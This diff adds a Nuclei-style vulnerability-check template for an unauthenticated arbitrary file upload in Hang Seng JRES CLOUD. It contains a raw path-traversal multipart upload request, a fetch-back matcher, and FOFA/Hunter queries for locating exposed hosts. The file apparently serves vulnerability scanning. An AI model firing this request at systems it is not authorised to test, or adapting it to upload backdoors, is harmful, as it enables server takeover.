@@ -1,0 +1,59 @@
+id: hangseng-jrescloud-uploadimage-fileupload
+
+info:
+  name: 恒生JRES CLOUD-uploadimage-fileupload
+  author: hufei
+  severity: critical
+  description: |
+    恒生JRES CLOUD-uploadimage-fileupload接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。
+  reference:
+    none
+  metadata:
+    max-request: 2
+    fofa-query: body="/acm/build/cloud"
+    hunter-query: web.body="/acm/build/cloud"
+    verified: true
+  tags: hangseng,fileuplaod,jrescloud
+
+variables:
+  name: '{{rand_base(5)}}'
+  flag: '{{rand_base(5)}}'
+
+http:
+  - raw:
+      - |
+        POST /acm/api/v1/../../see/view/uploadImage.json HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/535.2 (KHTML, like Gecko) FxiOS/10.6l3788.0 Mobile/56M372 Safari/535.2
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 370
+        Content-Type: multipart/form-data; boundary=05efc2857489dbf44e305ccd828d84dc
+        
+        --05efc2857489dbf44e305ccd828d84dc
+        Content-Disposition: form-data; name="fileName"
+        
+        {{name}}.txt
+        --05efc2857489dbf44e305ccd828d84dc
+        Content-Disposition: form-data; name="fileUrl"
+        
+        /
+        --05efc2857489dbf44e305ccd828d84dc
+        Content-Disposition: form-data; name="file"; filename="{{name}}.txt"
+        Content-Type: image/jpeg
+        
+        {{flag}}
+        --05efc2857489dbf44e305ccd828d84dc--
+
+      - |
+        GET /acm/{{name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains((body_2), '{{flag}}')"
+
